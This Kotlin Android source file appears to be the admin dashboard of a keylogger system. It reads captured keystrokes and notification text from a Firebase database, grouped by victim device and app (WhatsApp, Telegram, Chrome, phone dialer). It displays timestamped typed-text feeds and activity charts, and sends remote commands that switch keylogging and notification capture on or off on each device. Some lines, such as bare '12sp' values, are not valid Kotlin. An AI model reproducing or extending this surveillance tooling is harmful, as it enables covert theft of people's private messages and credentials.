package com.example.mykeyboardadmin

import android.graphics.Color
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Date
import java.util.Locale

class AdminMainActivity : AppCompatActivity() {

    private lateinit var recyclerView: RecyclerView
    private lateinit var txtConnectedDevices: TextView
    private lateinit var txtActivityEvents: TextView
    private lateinit var txtAppsToday: TextView
    private lateinit var txtActiveNodes: TextView
    private lateinit var txtLiveStatusPill: TextView
    private lateinit var containerAppsToday: LinearLayout
    private lateinit var etDeviceSearch: EditText
    private lateinit var hourBarChartView: HourBarChartView

    private val masterDeviceList = mutableListOf<DeviceModel>()
    private val filteredDeviceList = mutableListOf<DeviceModel>()
    private lateinit var adapter: DeviceAdapter
    private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"

    private var devicesListener: ValueEventListener? = null
    private var devicesRef: com.google.firebase.database.DatabaseReference? = null

    data class DeviceModel(
        val name: String,
        var keylogging: Boolean = true,
        var notifications: Boolean = true,
        var logFeed: String = "Waiting for telemetry...",
        var lastSeenTimestamp: Long = 0L
    )

    data class LogEntry(
        val timestamp: Long,
        val appName: String,
        val text: String
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            FirebaseApp.initializeApp(this)
        } catch (e: Exception) {
            e.printStackTrace()
        }
        setContentView(R.layout.activity_admin_main)

        txtConnectedDevices = findViewById<TextView>(R.id.txtConnectedDevices)
        txtActivityEvents = findViewById<TextView>(R.id.txtActivityEvents)
        txtAppsToday = findViewById<TextView>(R.id.txtAppsToday)
        txtActiveNodes = findViewById<TextView>(R.id.txtActiveNodes)
        txtLiveStatusPill = findViewById<TextView>(R.id.txtLiveStatusPill)
        containerAppsToday = findViewById<LinearLayout>(R.id.containerAppsToday)
        etDeviceSearch = findViewById<EditText>(R.id.etDeviceSearch)
        hourBarChartView = findViewById<HourBarChartView>(R.id.hourBarChartView)

        val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
        btnRefresh.setOnClickListener {
            loadConnectedDevices()
            Toast.makeText(this, "Refreshed & synced devices!", Toast.LENGTH_SHORT).show()
        }

        recyclerView = findViewById<RecyclerView>(R.id.recyclerViewDevices)
        recyclerView.layoutManager = LinearLayoutManager(this)
        adapter = DeviceAdapter(filteredDeviceList) { device, type, newState ->
            val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(device.name)
            if (type == "key") {
                device.keylogging = newState
                ref.child("keylogging").setValue(newState)
                ref.child("status").child("keylogging").setValue(newState)
            } else {
                device.notifications = newState
                ref.child("notifications").setValue(newState)
                ref.child("status").child("notifications").setValue(newState)
            }
            adapter.notifyDataSetChanged()
            Toast.makeText(this, "Command sent to ${device.name}", Toast.LENGTH_SHORT).show()
        }
        recyclerView.adapter = adapter

        // Search filtering
        etDeviceSearch.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                filterDevices(s?.toString() ?: "")
            }
            override fun afterTextChanged(s: Editable?) {}
        })

        loadConnectedDevices()
    }

    override fun onDestroy() {
        super.onDestroy()
        if (devicesListener != null && devicesRef != null) {
            devicesRef?.removeEventListener(devicesListener!!)
        }
    }

    private fun filterDevices(query: String) {
        filteredDeviceList.clear()
        if (query.isBlank()) {
            filteredDeviceList.addAll(masterDeviceList)
        } else {
            val lowerQuery = query.lowercase(Locale.getDefault())
            for (device in masterDeviceList) {
                if (device.name.lowercase(Locale.getDefault()).contains(lowerQuery)) {
                    filteredDeviceList.add(device)
                }
            }
        }
        adapter.notifyDataSetChanged()
    }

    private fun loadConnectedDevices() {
        if (devicesListener != null && devicesRef != null) {
            devicesRef?.removeEventListener(devicesListener!!)
        }

        devicesRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
        devicesListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val allEntries = mutableListOf<LogEntry>()
                val appsTodayMap = mutableMapOf<String, Int>()
                val hourlyCounts = FloatArray(24) { 0f }

                val now = System.currentTimeMillis()
                val calendar = Calendar.getInstance()
                val todayDayOfYear = calendar.get(Calendar.DAY_OF_YEAR)
                val todayYear = calendar.get(Calendar.YEAR)

                var maxLastSeen = 0L

                for (child in snapshot.children) {
                    val deviceName = child.key ?: continue
                    if (masterDeviceList.none { it.name == deviceName }) {
                        val device = DeviceModel(deviceName)
                        masterDeviceList.add(device)
                        listenToDeviceState(deviceName)
                        listenToDeviceLogs(deviceName)
                    }

                    for (appChild in child.children) {
                        val rawApp = appChild.key ?: continue
                        val prettyApp = getPrettyAppName(rawApp)
                        for (entry in appChild.children) {
                            val text = entry.child("text").getValue(String::class.java)
                                ?: entry.child("title").getValue(String::class.java)
                                ?: entry.child("typedContent").getValue(String::class.java)
                                ?: continue

                            val timestampMillis = parseTimestamp(entry.child("timestamp").value)
                            if (timestampMillis != null && text.isNotBlank() && text != "null") {
                                allEntries.add(LogEntry(timestampMillis, prettyApp, text))
                                if (timestampMillis > maxLastSeen) {
                                    maxLastSeen = timestampMillis
                                }

                                // Check if timestamp falls within today in local timezone
                                calendar.timeInMillis = timestampMillis
                                if (calendar.get(Calendar.DAY_OF_YEAR) == todayDayOfYear && calendar.get(Calendar.YEAR) == todayYear) {
                                    appsTodayMap[prettyApp] = (appsTodayMap[prettyApp] ?: 0) + 1
                                    val hour = calendar.get(Calendar.HOUR_OF_DAY)
                                    if (hour in 0..23) {
                                        hourlyCounts[hour]++
                                    }
                                }
                            }
                        }
                    }
                }

                // Update metrics
                val connectedCount = masterDeviceList.size
                txtConnectedDevices.text = connectedCount.toString()
                txtActivityEvents.text = allEntries.size.toString()
                txtAppsToday.text = appsTodayMap.size.toString()

                // Presence pill: Online only if actual activity recorded within last 2 minutes (120,000 ms)
                val isOnline = (now - maxLastSeen) < 120000L && maxLastSeen > 0L
                if (isOnline) {
                    txtLiveStatusPill.text = "● ONLINE"
                    txtLiveStatusPill.setTextColor(Color.parseColor("#22C55E"))
                    txtLiveStatusPill.setBackgroundColor(Color.parseColor("#1B4721"))
                    txtActiveNodes.text = "ONLINE"
                    txtActiveNodes.setTextColor(Color.parseColor("#22C55E"))
                } else {
                    txtLiveStatusPill.text = "● OFFLINE"
                    txtLiveStatusPill.setTextColor(Color.parseColor("#EF4444"))
                    txtLiveStatusPill.setBackgroundColor(Color.parseColor("#3F1F1F"))
                    txtActiveNodes.text = "OFFLINE"
                    txtActiveNodes.setTextColor(Color.parseColor("#EF4444"))
                }

                filterDevices(etDeviceSearch.text?.toString() ?: "")

                // Update Apps Recorded Today tile
                updateAppsTodayUI(appsTodayMap)

                // Update 24-hour activity chart
                hourBarChartView.setData(hourlyCounts)
            }

            override fun onCancelled(error: DatabaseError) {}
        }
        devicesRef?.addValueEventListener(devicesListener!!)
    }

    private fun parseTimestamp(value: Any?): Long? {
        return when (value) {
            is Long -> value
            is Number -> value.toLong()
            is String -> value.toLongOrNull()
            else -> null
        }
    }

    private fun updateAppsTodayUI(appsMap: Map<String, Int>) {
        containerAppsToday.removeAllViews()
        val sortedApps = appsMap.entries.sortedByDescending { it.value }

        if (sortedApps.isEmpty()) {
            val emptyTv = TextView(this).apply {
                text = "No app activity recorded today."
                textSize = 12sp
                setTextColor(Color.parseColor("#94A3B8"))
                setPadding(0, 4, 0, 4)
            }
            containerAppsToday.addView(emptyTv)
            return
        }

        val maxCount = sortedApps.first().value.toFloat().coerceAtLeast(1f)

        for ((appName, count) in sortedApps) {
            val rowLayout = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                setPadding(0, 6, 0, 6)
            }

            val headerRow = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
            }

            val nameTv = TextView(this).apply {
                text = appName
                textSize = 12sp
                textStyle = android.graphics.Typeface.BOLD
                setTextColor(Color.parseColor("#F1F5F9"))
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
            }

            val countTv = TextView(this).apply {
                text = "$count records"
                textSize = 11sp
                setTextColor(Color.parseColor("#38BDF8"))
                fontFamily = android.graphics.Typeface.MONOSPACE
            }

            headerRow.addView(nameTv)
            headerRow.addView(countTv)
            rowLayout.addView(headerRow)

            // Relative horizontal bar
            val barBg = View(this).apply {
                layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 6).apply { topMargin = 4 }
                setBackgroundColor(Color.parseColor("#1E293B"))
            }

            val percent = (count.toFloat() / maxCount).coerceIn(0.01f, 1f)
            val barFill = View(this).apply {
                layoutParams = LinearLayout.LayoutParams(0, 6).apply { topMargin = -6 }
                setBackgroundColor(Color.parseColor("#38BDF8"))
                // use weight or layout width proportionally
            }

            // Simple custom wrapper for relative bar
            val barContainer = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 6).apply { topMargin = 4 }
                setBackgroundColor(Color.parseColor("#1E293B"))
            }

            val fillView = View(this).apply {
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, percent)
                setBackgroundColor(Color.parseColor("#38BDF8"))
            }
            val emptyView = View(this).apply {
                layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, 1f - percent)
            }

            barContainer.addView(fillView)
            barContainer.addView(emptyView)
            rowLayout.addView(barContainer)

            containerAppsToday.addView(rowLayout)
        }
    }

    private fun listenToDeviceState(deviceName: String) {
        val cmdRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
        
        cmdRef.child("keylogging").get().addOnSuccessListener { 
            if (!it.exists()) cmdRef.child("keylogging").setValue(true) 
        }
        cmdRef.child("notifications").get().addOnSuccessListener { 
            if (!it.exists()) cmdRef.child("notifications").setValue(true) 
        }

        cmdRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val keyObj = snapshot.child("status").child("keylogging").value
                    ?: snapshot.child("keylogging").value
                val key = when (keyObj) {
                    is Boolean -> keyObj
                    is String -> keyObj.toBoolean()
                    else -> true
                }

                val notifObj = snapshot.child("status").child("notifications").value
                    ?: snapshot.child("notifications").value
                val notif = when (notifObj) {
                    is Boolean -> notifObj
                    is String -> notifObj.toBoolean()
                    else -> true
                }

                val index = masterDeviceList.indexOfFirst { it.name == deviceName }
                if (index != -1) {
                    masterDeviceList[index].keylogging = key
                    masterDeviceList[index].notifications = notif
                    adapter.notifyDataSetChanged()
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun getPrettyAppName(pkg: String): String {
        return when {
            pkg.contains("whatsapp", true) -> "WhatsApp"
            pkg.contains("chrome", true) -> "Chrome"
            pkg.contains("youtube", true) -> "YouTube"
            pkg.contains("instagram", true) -> "Instagram"
            pkg.contains("dialer", true) -> "Phone"
            pkg.contains("telegram", true) -> "Telegram"
            pkg.contains("settings", true) -> "Settings"
            else -> pkg.substringAfterLast('.')
        }
    }

    private fun listenToDeviceLogs(deviceName: String) {
        val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
        logRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val entries = mutableListOf<Triple<Long, String, String>>()
                val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())

                for (appChild in snapshot.children) {
                    val rawApp = appChild.key ?: continue
                    val prettyApp = getPrettyAppName(rawApp)
                    for (entry in appChild.children) {
                        val text = entry.child("text").getValue(String::class.java)
                            ?: entry.child("title").getValue(String::class.java)
                            ?: entry.child("typedContent").getValue(String::class.java)
                            ?: continue

                        val timestampMillis = parseTimestamp(entry.child("timestamp").value) ?: System.currentTimeMillis()

                        if (text.isNotBlank() && text != "null") {
                            entries.add(Triple(timestampMillis, prettyApp, text))
                        }
                    }
                }

                // Sort newest on top
                entries.sortByDescending { it.first }

                val sb = StringBuilder()
                for (item in entries) {
                    val timeStr = timeFormat.format(Date(item.first))
                    sb.append("[$timeStr] ${item.second}: ${item.third}\n")
                }

                val index = masterDeviceList.indexOfFirst { it.name == deviceName }
                if (index != -1) {
                    masterDeviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded yet."
                    adapter.notifyDataSetChanged()
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    class DeviceAdapter(
        private val devices: List<DeviceModel>,
        private val onToggle: (DeviceModel, String, Boolean) -> Unit
    ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {

        class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
            val txtDeviceName: TextView = view.findViewById<TextView>(R.id.txtDeviceName)
            val txtDeviceSub: TextView = view.findViewById<TextView>(R.id.txtDeviceSub)
            val txtPresencePill: TextView = view.findViewById<TextView>(R.id.txtPresencePill)
            val btnKey: Button = view.findViewById<Button>(R.id.btnToggleKeyLog)
            val btnNotif: Button = view.findViewById<Button>(R.id.btnToggleNotifLog)
            val txtLog: TextView = view.findViewById<TextView>(R.id.txtDeviceLogConsole)
            val scrollView: View = view.findViewById<View>(R.id.logScrollView)
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
            val view = LayoutInflater.from(parent.context).inflate(R.layout.item_device_control, parent, false)
            return ViewHolder(view)
        }

        override fun onBindViewHolder(holder: ViewHolder, position: Int) {
            val device = devices[position]
            holder.txtDeviceName.text = device.name
            holder.txtDeviceSub.text = "Active Node // Live Feed"

            if (device.keylogging) {
                holder.btnKey.text = "Key Logger: ON"
                holder.btnKey.setBackgroundResource(R.drawable.btn_green_rounded)
            } else {
                holder.btnKey.text = "Key Logger: OFF"
                holder.btnKey.setBackgroundResource(R.drawable.btn_red_rounded)
            }

            if (device.notifications) {
                holder.btnNotif.text = "Notif Logger: ON"
                holder.btnNotif.setBackgroundResource(R.drawable.btn_green_rounded)
            } else {
                holder.btnNotif.text = "Notif Logger: OFF"
                holder.btnNotif.setBackgroundResource(R.drawable.btn_red_rounded)
            }

            holder.scrollView.setOnTouchListener { v, event ->
                when (event.action) {
                    MotionEvent.ACTION_DOWN, MotionEvent.ACTION_MOVE -> {
                        v.parent.requestDisallowInterceptTouchEvent(true)
                    }
                    MotionEvent.ACTION_UP -> {
                        v.parent.requestDisallowInterceptTouchEvent(false)
                    }
                }
                false
            }
            holder.txtLog.text = device.logFeed

            holder.btnKey.setOnClickListener {
                onToggle(device, "key", !device.keylogging)
            }

            holder.btnNotif.setOnClickListener {
                onToggle(device, "notif", !device.notifications)
            }
        }

        override fun getItemCount() = devices.size
    }
}
